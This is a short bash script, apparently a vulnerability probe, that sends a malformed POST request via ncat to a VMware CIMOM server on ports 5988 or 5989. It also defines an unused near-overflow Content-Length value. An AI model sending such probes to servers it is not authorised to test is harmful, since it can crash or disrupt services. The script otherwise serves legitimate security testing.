#!/bin/bash
# ===============================================
# quick test of VMWare cimom monitoring HTTP server
# example usage:
# ./cimom_test.sh 127.0.0.1
XX="[==]"
IP=$1
CL=4294967292
SZ=10

echo -e "\n$XX Sending POST request to target: $IP"
echo -e "\n$XX Server Response:"

# non-SSL version. For SSL version, uncomment below instead
  echo -e "POST /cimom HTTP/1.1\nAAAAAAAAAA\r\n" |ncat $IP 5988

# SSL version. For non-SSL version, uncomment above instead
#  echo -e "POST /cimom HTTP/1.1\nAAAAAAAAAA\r\n" |ncat --ssl $IP 5989
